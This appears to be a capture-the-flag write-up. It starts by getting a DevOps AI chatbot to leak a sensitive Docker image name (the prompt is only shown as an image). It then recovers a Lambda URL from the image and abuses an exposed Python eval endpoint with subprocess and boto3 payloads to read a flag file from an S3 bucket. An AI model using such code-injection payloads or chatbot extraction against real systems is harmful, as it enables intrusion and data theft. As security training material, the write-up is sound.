# CHALLENGE WRITEUP

## AI CHATBOT

The challenge begins with an interaction with an AI chatbot, developed to help the company's engineers with DevOps tasks:  

*[Image: opsie]*  

As the challenge description suggests, we need to make the chatbot reveal sensitive info regarding specific docker images names.  

After a bit of trial and error, we are succesfull, using the following prompt:  
*[Image: prompt]*  
Now we know that the docker image we are looking for is `r3drun3/megacorp_uvbutglpol_lmctfwert:vxdgrft`.  

## PUBLIC DOCKER IMAGE

Search that image on dockerhub and pull it locally.  
Now we can inspect the container metadata by looking, for example, for labels:  
```console
❯ docker inspect --format '{{ json .Config.Labels }}' r3drun3/megacorp_uvbutglpol_lmctfwert:vxdgrft

{"description":"Lightweight and secure container with environment variables for AWS Lambda and a health check curl script.","maintainer":"JEFF <jeff.bugged@megacorp.com>"}
```  

And also env vars:  
```console
❯ docker inspect --format '{{ json .Config.Env }}' r3drun3/megacorp_uvbutglpol_lmctfwert:vxdgrft

["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","S3_BUCKET_NAME=wpctf-2025-flag-s3-bucket-0197643419247650","AWS_SERVICE=lambda","LAMBDA_URL=https://4xxrc4uf23jjk2j5l3euxctdhi0jbita.lambda-url.eu-west-1.on.aws/"]
```  

There are some interesting info here, for example an s3 bucket name and a lambda url.  

Run the container:  
```console
docker run --rm r3drun3/megacorp_uvbutglpol_lmctfwert:vxdgrft
```  

output:  
```console
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    26  100    24  100     2     21      1  0:00:02  0:00:01  0:00:01    23
Response from Lambda URL: healthy - ready to eval!
```  

This response is interesting: `healthy - ready to eval!`  

Now we can exec inside the container to find out more:  
```console
docker run -it --entrypoint /bin/sh r3drun3/megacorp_uvbutglpol_lmctfwert:vxdgrft
```  

let's move in the environment a bit by starting to list files:  
```console
/ # ls
bin            etc            media          proc           sbin           tmp
dev            home           mnt            root           srv            usr
entrypoint.sh  lib            opt            run            sys            var
```  

Let's inspect `entrypoint.sh`:  
```console
/ # cat entrypoint.sh
#!/bin/bash
 response=$(curl -X GET -H "Content-Type: application/json" -d "{}" "${LAMBDA_URL}health")
 echo "Response from Lambda URL: $response"
```  

This script does a GET request to the Lambda url we saw earlier in the container manifest.  
Let's inspect the env vars:  
```console
/ # env
HOSTNAME=8e146cb5d082
SHLVL=1
HOME=/root
S3_BUCKET_NAME=wpctf-2025-flag-s3-bucket-0197643419247650
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LAMBDA_URL=https://4xxrc4uf23jjk2j5l3euxctdhi0jbita.lambda-url.eu-west-1.on.aws/
AWS_SERVICE=lambda
PWD=/
```  

Again we see the lambda url and the bucket name, now we can direct our attentions to the lambda.  

## LAMBDA

Some commands to probe the lambda.
First of all, export the lambda url as an env var:    
```console
export LAMBDA_URL=<PUBLIC-LAMBDA-URL-HERE>
```  

test a basic get call, the same we found in the public docker container:  
```console
curl -X GET -H "Content-Type: application/json" -d '{}' "${LAMBDA_URL}health"
```  

Output:  
```console
healthy - ready to eval!
```  
Test a call to the base url:  
```console
curl -X GET -H "Content-Type: application/json" -d '{}' "${LAMBDA_URL}"
```  

Output:
```console
Endpoint not found
```  

Maybe we need to enumerate endpoints, try this with a tool like `gobuster`:  
```console
gobuster dir -k -t 20 -r --random-agent -u $LAMBDA_URL -w /usr/share/wordlists/dirb/big.txt -b 404,429
```  

Output:  
*[Image: gobuster]*  

The `eval` endpoint seems interesting, let's try to reach it!  
```console
curl -X GET -H "Content-Type: application/json" -d '{}' "${LAMBDA_URL}eval"
```

Output:  
```console
No code provided.
```  

From the response it seems we need to provide some code, let's try with the following:   
```console
curl -X GET -H "Content-Type: application/json" -d '{code: ls}' "${LAMBDA_URL}eval"
```  

output:  
```console
Error: Expecting property name enclosed in double quotes: line 1 column 2 (char 1)
```  

After some testing, we submit this:  
```console
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "2 + 2"}' \
  "${LAMBDA_URL}eval"
```  

output:
```console
{"result": "4"}
```  

Interesting! it seems that the endpoint allows the evaluation of python code!  
let's try with some other payloads, for example let's try to list local files:  
```console
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__(\"subprocess\").check_output(\"ls\", shell=True).decode(\"utf-8\")"}' \
  "${LAMBDA_URL}eval"
```  

Output:  
```console
{"result": "lambda_function.py\n"}%
```  
We are able to list local files!  
It is likely that the company left this endpoint as a public gateway, as a tool for executing code (believing they could secure the `eval` endpoint by obscuring it).  
Since this is a Lambda function, it is reasonable to assume we can interact with AWS resources using the `boto3` library.  
Let's attempt some enumeration.  
remeber that, from the public docker container, we found the `wpctf-2025-flag-s3-bucket-0197643419247650` s3 bucket name, let's try to see if we can access that via the [*head_bucket*](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3/client/head_bucket.html) operation:  
```console
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__(\"boto3\").client(\"s3\").head_bucket(Bucket=\"wpctf-2025-flag-s3-bucket-0197643419247650\")"}' \
  "${LAMBDA_URL}eval"
```  

Output:  
```console
{"result": "{'ResponseMetadata': {'RequestId': 'ZZGFK04S4K16HTS5', 'HostId': 'qqih2Xj+ZfKNt15SpDQV7TPze/qb7uYeFfPj9bg45FHfqrcNcAqCDMi/V7RkXaBv/oJVDrufEj8=', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amz-id-2': 'qqih2Xj+ZfKNt15SpDQV7TPze/qb7uYeFfPj9bg45FHfqrcNcAqCDMi/V7RkXaBv/oJVDrufEj8=', 'x-amz-request-id': 'ZZGFK04S4K16HTS5', 'date': 'Sun, 26 Jan 2025 09:43:43 GMT', 'x-amz-bucket-region': 'eu-west-1', 'x-amz-access-point-alias': 'false', 'content-type': 'application/xml', 'transfer-encoding': 'chunked', 'server': 'AmazonS3'}, 'RetryAttempts': 0}, 'BucketRegion': 'eu-west-1', 'AccessPointAlias': False}"}
```  

Yes! that bucket exist and we can access it!  

Let's retrieve the lists of files in that:  
```console
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__(\"boto3\").client(\"s3\").list_objects_v2(Bucket=\"wpctf-2025-flag-s3-bucket-0197643419247650\")"}' \
  "${LAMBDA_URL}eval"
```  

Output:  
```console
{"result": "{'ResponseMetadata': {'RequestId': '1VM6GRWPE2DM3JQA', 'HostId': 'AcvAYhvz3YLz2xq460do2TyC86z85Xf6g7B0kXi+8DoG2evVVcrjJzhIDhhQOen4KunMFdvR+m/AUuqTIul7GQ==', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amz-id-2': 'AcvAYhvz3YLz2xq460do2TyC86z85Xf6g7B0kXi+8DoG2evVVcrjJzhIDhhQOen4KunMFdvR+m/AUuqTIul7GQ==', 'x-amz-request-id': '1VM6GRWPE2DM3JQA', 'date': 'Sun, 26 Jan 2025 09:50:41 GMT', 'x-amz-bucket-region': 'eu-west-1', 'content-type': 'application/xml', 'transfer-encoding': 'chunked', 'server': 'AmazonS3'}, 'RetryAttempts': 0}, 'IsTruncated': False, 'Contents': [{'Key': 'flag.txt', 'LastModified': datetime.datetime(2025, 1, 26, 9, 41, 4, tzinfo=tzlocal()), 'ETag': '\"d092ba3316fd098ba251884c410c04f2\"', 'Size': 40, 'StorageClass': 'STANDARD'}], 'Name': 'wpctf-2025-flag-s3-bucket-0197643419247650', 'Prefix': '', 'MaxKeys': 1000, 'EncodingType': 'url', 'KeyCount': 1}"}%
```  

As we can see from the previous output, there is a `flag.txt` file in that bucket, let's retrieve that:  
```console
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__(\"boto3\").client(\"s3\").get_object(Bucket=\"wpctf-2025-flag-s3-bucket-0197643419247650\", Key=\"flag.txt\")[\"Body\"].read().decode(\"utf-8\")"}' \
  "${LAMBDA_URL}eval"
```  

And we have our flag !!! 🏴 🏳️  
*[Image: flag]*  

The following diagram summarizes the exploitation path:  
*[Image: exploitation]*  

